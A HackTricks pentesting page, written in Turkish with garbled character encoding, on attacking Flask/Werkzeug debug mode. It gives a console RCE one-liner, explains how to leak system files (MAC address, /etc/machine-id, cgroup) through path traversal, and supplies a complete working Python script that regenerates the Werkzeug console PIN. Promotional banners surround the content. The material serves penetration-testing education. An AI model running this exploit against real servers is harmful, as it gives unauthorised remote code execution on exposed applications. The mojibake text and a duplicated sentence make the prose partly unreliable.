# Werkzeug / Flask Debug

<details>

<summary><strong>AWS hackleme becerilerini sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek veya HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek paylaÅŸÄ±n**.

</details>

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Her yerden eriÅŸilebilir durumda olan zafiyet deÄŸerlendirme ve penetrasyon testi kurulumu**. KeÅŸiften raporlamaya kadar 20+'den fazla araÃ§ ve Ã¶zellikle tam bir pentest Ã§alÄ±ÅŸtÄ±rÄ±n. Pentester'larÄ± deÄŸiÅŸtirmiyoruz - onlara daha derine kazma, kabuk aÃ§ma ve eÄŸlenme zamanÄ± kazandÄ±rmak iÃ§in Ã¶zel araÃ§lar, tespit ve istismar modÃ¼lleri geliÅŸtiriyoruz.

{% embed url="https://pentest-tools.com/" %}

## Konsol RCE

EÄŸer hata ayÄ±klama etkinse, `/console`'a eriÅŸmeyi deneyebilir ve RCE elde edebilirsiniz.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Ä°nternette [bu](https://github.com/its-arun/Werkzeug-Debug-RCE) gibi birkaÃ§ saldÄ±rÄ± da bulunmaktadÄ±r veya metasploit'te bir tane.

## Pin KorumalÄ± - Yol GeÃ§iÅŸi

BazÄ± durumlarda **`/console`** ucu noktasÄ± bir pin ile korunacaktÄ±r. EÄŸer bir **dosya geÃ§iÅŸi aÃ§Ä±ÄŸÄ±**nÄ±z varsa, o pin'i oluÅŸturmak iÃ§in gerekli tÃ¼m bilgileri sÄ±zdÄ±rabilirsiniz.

### Werkzeug Console PIN SÃ¶mÃ¼rÃ¼sÃ¼

Uygulamada bir hata sayfasÄ± oluÅŸturarak bunu zorlayÄ±n:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
"Werkzeug"Ä±n hata ayÄ±klama arayÃ¼zÃ¼ne eriÅŸmeye Ã§alÄ±ÅŸÄ±rken "konsol kilitli" senaryosuyla ilgili bir iletiyle karÅŸÄ±laÅŸÄ±lÄ±r ve konsolu kilidini aÃ§mak iÃ§in bir PIN gerektiÄŸi belirtilir. Werkzeug'Ä±n hata ayÄ±klama baÅŸlatma dosyasÄ±ndaki (`__init__.py`) PIN oluÅŸturma algoritmasÄ±nÄ± analiz ederek konsol PIN'ini sÃ¶mÃ¼rme Ã¶nerilir. PIN oluÅŸturma mekanizmasÄ± [**Werkzeug kaynak kodu deposundan**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) incelenebilir, ancak potansiyel sÃ¼rÃ¼m uyumsuzluklarÄ± nedeniyle gerÃ§ek sunucu kodunu bir dosya gezinti aÃ§Ä±ÄŸÄ±yla elde etmek Ã¶nerilir.

Konsol PIN'ini sÃ¶mÃ¼rmek iÃ§in `probably_public_bits` ve `private_bits` adlÄ± iki set deÄŸiÅŸkene ihtiyaÃ§ vardÄ±r:

#### **`probably_public_bits`**
- **`username`**: Flask oturumunu baÅŸlatan kullanÄ±cÄ±yÄ± ifade eder.
- **`modname`**: Genellikle `flask.app` olarak belirlenir.
- **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Genellikle **Flask**'a Ã§Ã¶zÃ¼lÃ¼r.
- **`getattr(mod, '__file__', None)`**: Flask dizinindeki `app.py`'nin tam yolunu temsil eder (Ã¶rneÄŸin, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). `app.py` uygulanamazsa, **`app.pyc`** deneyin.

#### **`private_bits`**
- **`uuid.getnode()`**: GeÃ§erli makinenin MAC adresini alÄ±r ve `str(uuid.getnode())` onu ondalÄ±k bir formata Ã§evirir.
- **Sunucunun MAC adresini belirlemek** iÃ§in, uygulama tarafÄ±ndan kullanÄ±lan etkin aÄŸ arabirimini belirlemek gerekmektedir (Ã¶rneÄŸin, `ens3`). Belirsizlik durumunda, cihaz kimliÄŸini bulmak iÃ§in **`/proc/net/arp`'Ä± sÄ±zdÄ±rÄ±n**, ardÄ±ndan **`/sys/class/net/<device id>/address`** adresinden MAC adresini **Ã§Ä±karÄ±n**.
- OndalÄ±k bir MAC adresini onaltÄ±lÄ±ÄŸa dÃ¶nÃ¼ÅŸtÃ¼rmek aÅŸaÄŸÄ±daki gibi yapÄ±labilir:
```python
# Ã–rnek MAC adresi: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
- **`get_machine_id()`**: `/etc/machine-id` veya `/proc/sys/kernel/random/boot_id` dosyasÄ±ndan alÄ±nan verileri `/proc/self/cgroup`'Ä±n son slash (`/`) sonrasÄ±ndaki ilk satÄ±rÄ±yla birleÅŸtirir.

<details>
<summary>`get_machine_id()` iÃ§in kod</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Gerekli tÃ¼m veriler toplandÄ±ktan sonra, Werkzeug konsol PIN'i oluÅŸturmak iÃ§in saldÄ±rÄ± betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±labilir:

Gerekli tÃ¼m veriler toplandÄ±ktan sonra, Werkzeug konsol PIN'i oluÅŸturmak iÃ§in saldÄ±rÄ± betiÄŸi Ã§alÄ±ÅŸtÄ±rÄ±labilir. Betik, birleÅŸtirilmiÅŸ `probably_public_bits` ve `private_bits` kullanarak bir karma oluÅŸturur ve daha sonra bu karma daha fazla iÅŸleme tabi tutularak nihai PIN Ã¼retilir. AÅŸaÄŸÄ±da bu iÅŸlemi gerÃ§ekleÅŸtirmek iÃ§in Python kodu bulunmaktadÄ±r:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Bu betik, bitlerin birleÅŸtirilerek karma algoritmasÄ±yla PIN Ã¼retir, belirli tuzlar (`cookiesalt` ve `pinsalt`) ekler ve Ã§Ä±ktÄ±yÄ± biÃ§imlendirir. Werkzeug konsolu tarafÄ±ndan beklenen PIN ile eÅŸleÅŸtiÄŸinden emin olmak iÃ§in `probably_public_bits` ve `private_bits` iÃ§in gerÃ§ek deÄŸerlerin hedef sistemden doÄŸru bir ÅŸekilde elde edilmesi Ã¶nemlidir.


{% hint style="success" %}
EÄŸer Werkzeug'Ä±n **eski bir sÃ¼rÃ¼mÃ¼nde** iseniz, **karma algoritmasÄ±nÄ± sha1 yerine md5 olarak deÄŸiÅŸtirmeyi deneyin**.
{% endhint %}

## Referanslar

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="/.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Zafiyet deÄŸerlendirmesi ve penetrasyon testi iÃ§in anÄ±nda kullanÄ±labilir kurulum**. 20'den fazla araÃ§ ve Ã¶zellikle birlikte her yerden tam bir pentest Ã§alÄ±ÅŸtÄ±rÄ±n. Biz pentesterlarÄ± deÄŸiÅŸtirmiyoruz - onlara daha derine kazmak, kabuklarÄ± patlatmak ve eÄŸlenmek iÃ§in biraz zaman kazandÄ±rmak iÃ§in Ã¶zel araÃ§lar, tespit ve istismar modÃ¼lleri geliÅŸtiriyoruz.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>
